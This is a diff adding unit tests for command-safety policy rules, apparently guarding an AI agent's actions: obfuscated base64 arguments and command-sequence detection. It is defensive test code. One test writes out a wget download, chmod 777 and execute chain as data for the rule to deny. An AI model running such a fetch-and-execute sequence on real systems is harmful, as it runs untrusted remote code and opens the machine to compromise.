@@ -81,6 +81,25 @@ def test_obfuscated_command_rule_abstains_on_plain_argv():
     assert ObfuscatedCommandRule().evaluate(action) is None
 
 
+def test_obfuscated_command_rule_abstains_on_empty_argv():
+    action = PolicyAction(name="noop", argv=[], source=ActionSource.NUDGER)
+    assert ObfuscatedCommandRule().evaluate(action) is None
+
+
+def test_obfuscated_command_rule_abstains_when_decoded_combo_not_forbidden():
+    import base64
+    encoded = base64.b64encode(b"status --verbose").decode()
+    action = PolicyAction(name="git", argv=["git", encoded], source=ActionSource.NUDGER)
+    assert ObfuscatedCommandRule().evaluate(action) is None
+
+
+def test_normalize_argv_ignores_base64_looking_non_utf8_garbage():
+    from self_governance.policy_rules.command_safety import _normalize_argv
+    garbage = "////////////////"  # valid base64 alphabet chars, decodes to invalid utf-8
+    normalized = _normalize_argv(["git", garbage])
+    assert "git" in normalized
+
+
 # --- Command sequence detection -------------------------------------------
 
 def test_command_sequence_rule_flags_download_chmod_execute_chain():
@@ -95,6 +114,14 @@ def test_command_sequence_rule_allows_unrelated_commands():
     rule = CommandSequenceRule()
     assert rule.evaluate(PolicyAction(name="git", argv=["git", "status"])) is None
     assert rule.evaluate(PolicyAction(name="git", argv=["git", "log"])) is None
+
+
+def test_command_sequence_rule_flags_wget_chmod_execute_chain():
+    rule = CommandSequenceRule()
+    assert rule.evaluate(PolicyAction(name="wget", argv=["wget", "http://x/y"])) is None
+    assert rule.evaluate(PolicyAction(name="chmod", argv=["chmod", "777", "y"])) is None
+    result = rule.evaluate(PolicyAction(name="run", argv=["./y"]))
+    assert result is not None and result.decision == Decision.DENY
 
 
 # --- Provenance-gated actions ----------------------------------------------
